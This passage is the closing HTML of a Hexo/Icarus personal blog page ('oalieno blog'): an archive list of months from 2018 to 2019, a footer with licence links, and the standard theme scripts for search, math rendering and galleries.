                <span class="level-start">
                    <span class="level-item">September 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/06/">
                <span class="level-start">
                    <span class="level-item">June 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">3</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/05/">
                <span class="level-start">
                    <span class="level-item">May 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/04/">
                <span class="level-start">
                    <span class="level-item">April 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">2</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/03/">
                <span class="level-start">
                    <span class="level-item">March 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">2</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2018/11/">
                <span class="level-start">
                    <span class="level-item">November 2018</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2018/08/">
                <span class="level-start">
                    <span class="level-item">August 2018</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        </ul>
        </div>
    </div>
</div>
    
    
        <div class="column-right-shadow is-hidden-widescreen ">
        
        </div>
    
</div>

                
            </div>
        </div>
    </section>
    <footer class="footer">
    <div class="container">
        <div class="level">
            <div class="level-start has-text-centered-mobile">
                <a class="footer-logo is-block has-mb-6" href="/">
                
                    oalieno blog
                
                </a>
                <p class="is-size-7">
                &copy; 2021 oalieno&nbsp;
                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
                
                <br>
                <span id="busuanzi_container_site_uv">
                Visited by <span id="busuanzi_value_site_uv">0</span> users
                </span>
                
                </p>
            </div>
            <div class="level-end">
            
                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/">
                        
                        <i class="fab fa-creative-commons"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
                        
                        <i class="fab fa-creative-commons-by"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/oalieno/oalieno.github.io">
                        
                        <i class="fab fa-github"></i>
                        
                    </a>
                </p>
                
                </div>
            
            </div>
        </div>
    </div>
</footer>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
<script>moment.locale("en");</script>


<script>
var IcarusThemeSettings = {
    site: {
        url: 'https://oalieno.github.io',
        external_link: {"enable":true,"exclude":[]}
    },
    article: {
        highlight: {
            clipboard: true,
            fold: 'unfolded'
        }
    },
    github: {
        url: 'https://github.com/oalieno/oalieno.github.io'
    }
};
</script>


<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>





<script src="/js/animation.js"></script>



<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
<script src="/js/gallery.js" defer></script>



<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
            my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        });
    });
</script>


<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    MathJax.Hub.Config({
        'HTML-CSS': {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
});
</script>


<a id="bottom-to-top" title="plugin.bottomtotop" href="javascript:;">
    <i class="fas fa-chevron-up"></i>
</a>
<script src="/js/bottom-to-top.js" defer></script>













<script src="/js/main.js" defer></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/lazysizes.min.js" defer></script>

    
    <div class="searchbox ins-search">
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Pages',
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script src="/js/insight.js" defer></script>
<link rel="stylesheet" href="/css/search.css">
<link rel="stylesheet" href="/css/insight.css">
    
</body>
</html>